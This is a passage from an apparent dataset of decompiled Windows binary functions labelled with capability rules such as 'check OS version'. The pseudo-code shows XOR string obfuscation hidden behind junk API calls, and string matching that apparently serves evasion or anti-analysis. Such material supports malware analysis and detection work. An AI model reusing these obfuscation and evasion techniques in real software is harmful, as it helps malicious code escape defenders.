1;\n    } while (iVar7 < 5);\n    var_8h = 0x780f2e2d;\n    var_4h._0_2_ = 0x3365;\n    var_28h = 0x304c616f;\n    var_24h._0_2_ = 0x3336;\n    uVar5 = (*pcVar2)(8, 7);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c0h = iVar6;\n    var_bch = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar8 != 0xe8bc46) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 6);\n    var_8h = 0xa03126f;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x53);\n    var_28h = 0x524c5039;\n    var_24h._0_2_ = 0x6b53;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_bch = iVar6;\n    var_b8h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar8 != 0xdf1792) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x137b0122;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x51);\n    var_28h = 0x46364473;\n    var_24h._0_2_ = 0x4251;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b8h = iVar6;\n    var_b4h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar8 != 0xe01569) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_8h = 0x60c0b1f;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x30);\n    var_28h = 0x4f4f464c;\n    var_24h._0_2_ = 0x6c30;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b4h = iVar6;\n    var_b0h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar8 != 0xf1beaa) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    var_1ch = 0x101d1619;\n    var_18h = 0x75706f3e;\n    var_14h._0_1_ = 0x69;\n    var_14h._1_1_ = 99;\n    var_14h._2_2_ = 0x7b42;\n    var_10h._0_1_ = 0x60;\n    var_10h._1_1_ = 0x68;\n    var_10h._2_1_ = 0x79;\n    var_10h._3_1_ = 0x65;\n    var_ch._0_1_ = 0x72;\n    var_8h = 0x55495850;\n    var_4h._0_2_ = 0x4f72;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b0h = iVar6;\n    var_ach = &var_1ch - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar8 != 0x53c27f) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x2e;\n    var_10h._2_1_ = 0x7c;\n    var_10h._3_1_ = 0x60;\n    var_ch._0_1_ = 0x59;\n    var_ch._1_1_ = 0x40;\n    var_ch._2_1_ = 0x78;\n    var_8h = 0x34327a78;\n    var_4h._0_2_ = 0x7174;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_ach = iVar6;\n    var_30h = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar8 != 0xed0a59) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 7);\n    var_28h = 0x1d7d3712;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x71);\n    var_70h = 0x54337841;\n    var_6ch._0_2_ = CONCAT11(var_6ch._1_1_, 0x71);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_28h - iVar6;\n    var_8h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar8 != 0xb883db) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    *0x41e1e0 = var_c4h;\n    *0x41e1e8 = var_c0h;\n    *0x41e1ec = var_bch;\n    *0x41e1f0 = var_b8h;\n    *0x41e1f4 = var_b4h;\n    uVar10 = 0;\n    *0x41e1f8 = var_b0h;\n    *0x41e1fc = var_ach;\n    *0x41e200 = iVar6;\n    do {\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd0, *(uVar10 + 0x41e1e0));\n        if (iVar6 != 0) {\n            fcn.004018ac();\n        }\n        uVar10 = uVar10 + 4;\n    } while (uVar10 < 0x20);\n    var_1ch = 0x8210d19;\n    var_18h = 0xb26712d;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_2_ = 0x4127;\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x42;\n    var_70h = 0x6d45644f;\n    var_6ch._0_2_ = 0x3342;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_1ch - iVar6;\n    var_28h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        puVar9 = extraout_ECX_00;\n        if (iVar8 != 0x9a3fb) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_70h + iVar7 % var_34h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    cVar3 = fcn.004016aa(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004018ac();\n    }\n    var_14h._0_1_ = 0x2e;\n    var_14h._1_1_ = 5;\n    var_14h._2_2_ = 0x2545;\n    var_10h._0_1_ = 0x3b;\n    var_10h._1_1_ = 0x19;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 0x75;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x78;\n    var_78h = 0x51376c78;\n    var_74h._0_1_ = 0x4e;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_70h = iVar6;\n    var_30h = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar8 != 0xba2972) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xb);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004018ac();\n    }\n    var_67h._0_1_ = 6;\n    var_68h = 4;\n    stack0xffffff96 = 0x2d1c2470;\n    var_62h._0_1_ = 5;\n    stack0xffffff9b = 0x223d6a0c;\n    _var_5dh = 0x4526250f;\n    stack0xffffffa3 = 0xb182d1f;\n    stack0xffffffa7 = 0x2f1e5f1e;\n    var_54h._3_1_ = 3;\n    var_50h._0_2_ = 0x3a20;\n    var_50h._2_1_ = 0x6a;\n    stack0xffffffaf = 0x251e3e33;\n    var_49h = 0x1d04582c;\n    var_45h = 0x5f3a2509;\n    var_41h._0_1_ = 0x1f;\n    var_41h._1_1_ = 0x25;\n    var_41h._2_1_ = 0x6c;\n    var_98h = 0x70364957;\n    var_94h._0_2_ = 0x6c4b;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_30h = &var_68h + -iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        puVar9 = extraout_ECX_01;\n        if (iVar8 != 0xa17df9) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_98h + iVar7 % var_34h) ^ puVar9[&var_68h + -iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x2a);\n    cVar3 = fcn.004016aa(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004018ac();\n    }\n    var_20h = 0x4d500c02;\n    var_1ch = 0xd01597e;\n    var_18h = 0x42785752;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 10;\n    var_14h._2_2_ = 0x4c52;\n    var_10h._0_1_ = 0x7e;\n    var_10h._1_1_ = 0x59;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x5b;\n    var_ch._1_1_ = 0x4f;\n    var_ch._2_1_ = 0x7a;\n    var_ch._3_1_ = 0x74;\n    var_3ch = 0x7a623937;\n    var_38h._0_2_ = 0x744a;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_98h = iVar6;\n    var_30h = &var_20h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar8 != 0x29a832) {\n            *(iVar7 + iVar6) = *(&var_3ch + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_20h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004018ac();\n    }\n    stack0xffffffa3 = stack0xffffffa3 & 0xff | 0x425e4200;\n    stack0xffffffa7 = 0x436b527f;\n    var_54h._3_1_ = 0x5c;\n    var_50h._0_2_ = 0x6a42;\n    var_50h._2_1_ = 0x56;\n    stack0xffffffaf = 0x465f4277;\n    var_49h = 0x476b5274;\n    var_45h = 0x5576435b;\n    var_41h._0_1_ = 0x46;\n    var_10h._0_1_ = 0x75;\n    var_10h._1_1_ = 0x68;\n    var_10h._2_1_ = 0x76;\n    var_10h._3_1_ = 0x47;\n    var_ch._0_1_ = 0x65;\n    var_ch._1_1_ = 0x46;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_3ch = iVar6;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar8 != 0x24440a) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.004018ac();\n    }\n    stack0xffffffa3 = stack0xffffffa3 & 0xff | 0x2070400;\n    stack0xffffffa7 = 0x14470d;\n    var_54h._3_1_ = 2;\n    var_50h._0_2_ = 0x1801;\n    var_50h._2_1_ = 0x48;\n    stack0xffffffaf = 0xf08010d;\n    var_49h = 0x1144500;\n    var_45h = 0x44040003;\n    var_41h._0_1_ = 0x39;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x31;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x70;\n    var_ch._1_1_ = 0x39;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar8 != 0x701a1d) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_34h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ddd0, iVar6);\n    iVar7 = var_3ch;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.004018ac();\n    }\n    uVar5 = (*pcVar2)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_28h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_2ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar10 = (*pcVar1)(uVar5);\n    return uVar10 & 0xffffff00;\n}\n",
        "token_count": 9616
    },
    "004028c5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004028c5(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uchar var_48h;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_39h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41dad0 | *0x41dad4) == 0) || ((*0x41dad8 | *0x41dadc) == 0)) || ((*0x41dae0 | *0x41dae4) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0xf0c2326;\n        var_30h = 0x433661e;\n        var_2ch._0_3_ = CONCAT12(var_2ch._2_1_, 0x720f);\n        var_24h = 0x63685748;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x72);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_14h = 5;\n        iVar7 = 0;\n        var_1ch = &var_34h - iVar2;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar3 != 0xc1c0d5) {\n                *(iVar7 + iVar2) = *(&var_24h + iVar7 % var_14h) ^ (iVar7 + iVar2)[var_1ch];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_ch = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_ch == 0) {\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_34h = 0x25145325;\n        var_30h = 0x2253083d;\n        var_2ch._0_3_ = 0x693e05;\n        var_24h = 0x69663769;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x52);\n        uVar1 = (*pcVar5)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_18h = &var_34h - iVar2;\n        var_1ch = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar3 != 0x542243) {\n                *(iVar7 + iVar2) = *(&var_24h + iVar7 % var_14h) ^ (iVar7 + iVar2)[var_18h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41dad0 = fcn.00408a3b();\n        iVar7 = var_10h;\n        *0x41dad4 = *0x41dad0 >> 0x1f;\n        if ((*0x41dad0 | *0x41dad4) == 0) {\n            uVar1 = (*pcVar5)(0, iVar2);\n            pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, iVar7);\n            (*pcVar4)(uVar1);\n            return var_4h;\n        }\n        var_4ch = 0x2e110905;\n        _var_48h = 0x1f191108;\n        stack0xffffffb8 = 0x1080a0c;\n        var_43h._3_1_ = 0x3c;\n        var_3fh._0_1_ = 0x1f;\n        var_18h = 6;\n        var_3fh._1_1_ = 6;\n        stack0xffffffbf = 0x3b010928;\n        var_39h._0_1_ = 8;\n        var_39h._1_2_ = 0x1a10;\n        var_39h._3_1_ = 0x6d;\n        var_24h = 0x69636d49;\n        var_20h._0_2_ = 0x656d;\n        uVar1 = (*pcVar5)(8, 0x18);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_14h = &var_4ch - iVar2;\n        var_8h = iVar2;\n        do {\n            pcVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (pcVar4 != fcn.00402f48) {\n                *(iVar7 + iVar2) = *(&var_24h + iVar7 % var_18h) ^ (iVar7 + iVar2)[var_14h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x17);\n        *0x41dad8 = fcn.00408a3b();\n        iVar7 = var_10h;\n        iVar2 = var_1ch;\n        *0x41dadc = *0x41dad8 >> 0x1f;\n        if ((*0x41dad8 | *0x41dadc) == 0) {\n            uVar1 = (*pcVar5)(0, var_8h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x403d420b;\n            _var_48h = 0x56341d2b;\n            stack0xffffffb8 = 0x1b2d6419;\n            var_43h._3_1_ = 0x25;\n            var_3fh._0_1_ = 0x40;\n            var_3fh._1_1_ = 0xc;\n            stack0xffffffbf = 0x3c0c095e;\n            var_39h._0_1_ = 0x5a;\n            var_39h._1_2_ = 0x4b1f;\n            var_39h._3_1_ = 0x44;\n            var_30h = 0x326d3551;\n            var_2ch._0_3_ = CONCAT12(var_2ch._2_1_, 0x6944);\n            uVar1 = (*pcVar5)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_24h = &var_4ch - iVar2;\n            var_14h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                if (iVar3 != 0xfdcdf3) {\n                    *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_18h) ^ (iVar7 + iVar2)[var_24h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dae0 = fcn.00408a3b();\n            iVar7 = var_10h;\n            iVar2 = var_1ch;\n            *0x41dae4 = *0x41dae0 >> 0x1f;\n            if ((*0x41dae0 | *0x41dae4) != 0) {\n                var_4h = 0;\n                uVar1 = (*pcVar5)(0, var_14h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*pcVar5)(uVar1);\n                pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar7);\n                (*pcVar5)(uVar1);\n                goto code_r0x00402bfd;\n            }\n            uVar1 = (*pcVar5)(0, var_14h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar7);\n        (*pcVar5)(uVar1);\n    }\n    else {\ncode_r0x00402bfd:\n        puVar6 = 0x41dad0;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2423
    },
    "00402c13": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402c13(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uchar var_48h;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_39h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41dae8 | *0x41daec) == 0) || ((*0x41daf0 | *0x41daf4) == 0)) || ((*0x41daf8 | *0x41dafc) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0xf0c2326;\n        var_30h = 0x433661e;\n        var_2ch._0_3_ = CONCAT12(var_2ch._2_1_, 0x720f);\n        var_24h = 0x63685748;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x72);\n        var_10h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_14h = 5;\n        iVar8 = 0;\n        var_1ch = &var_34h - iVar2;\n        var_ch = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar3 != 0xc1c0d5) {\n                *(iVar8 + iVar2) = *(&var_24h + iVar8 % var_14h) ^ (iVar8 + iVar2)[var_1ch];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 10);\n        var_34h = 0x25145325;\n        var_30h = 0x2253083d;\n        var_2ch._0_3_ = 0x693e05;\n        var_24h = 0x69663769;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x52);\n        uVar1 = (*pcVar6)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar8 = 0;\n        var_18h = &var_34h - iVar2;\n        var_1ch = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar3 = var_ch;\n            if (iVar4 != 0x542243) {\n                *(iVar8 + iVar2) = *(&var_24h + iVar8 % var_14h) ^ (iVar8 + iVar2)[var_18h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xb);\n        *0x41dae8 = fcn.00409867(iVar2);\n        if (*0x41dae8 == 0) {\n            uVar1 = (*pcVar6)(0, iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar6)(0, iVar3);\n            (*pcVar5)(uVar1);\n            goto code_r0x00402f3f;\n        }\n        var_4ch = 0x2e110905;\n        _var_48h = 0x1f191108;\n        stack0xffffffb8 = 0x1080a0c;\n        var_43h._3_1_ = 0x3c;\n        var_3fh._0_1_ = 0x1f;\n        var_18h = 6;\n        var_3fh._1_1_ = 6;\n        stack0xffffffbf = 0x3b010928;\n        var_39h._0_1_ = 8;\n        var_39h._1_2_ = 0x1a10;\n        var_39h._3_1_ = 0x6d;\n        var_24h = 0x69636d49;\n        var_20h._0_2_ = 0x656d;\n        uVar1 = (*pcVar6)(8, 0x18);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar8 = 0;\n        var_14h = &var_4ch - iVar2;\n        var_8h = iVar2;\n        do {\n            pcVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            iVar3 = var_ch;\n            if (pcVar5 != fcn.00402f48) {\n                *(iVar8 + iVar2) = *(&var_24h + iVar8 % var_18h) ^ (iVar8 + iVar2)[var_14h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x17);\n        *0x41daf0 = fcn.00409867(iVar2);\n        iVar2 = var_1ch;\n        if (*0x41daf0 == 0) {\n            uVar1 = (*pcVar6)(0, var_8h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x403d420b;\n            _var_48h = 0x56341d2b;\n            stack0xffffffb8 = 0x1b2d6419;\n            var_43h._3_1_ = 0x25;\n            var_3fh._0_1_ = 0x40;\n            var_3fh._1_1_ = 0xc;\n            stack0xffffffbf = 0x3c0c095e;\n            var_39h._0_1_ = 0x5a;\n            var_39h._1_2_ = 0x4b1f;\n            var_39h._3_1_ = 0x44;\n            var_30h = 0x326d3551;\n            var_2ch._0_3_ = CONCAT12(var_2ch._2_1_, 0x6944);\n            uVar1 = (*pcVar6)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar8 = 0;\n            var_24h = &var_4ch - iVar2;\n            var_14h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                iVar3 = var_ch;\n                if (iVar4 != 0xfdcdf3) {\n                    *(iVar8 + iVar2) = *(&var_30h + iVar8 % var_18h) ^ (iVar8 + iVar2)[var_24h];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x17);\n            *0x41daf8 = fcn.00409867(iVar2);\n            iVar2 = 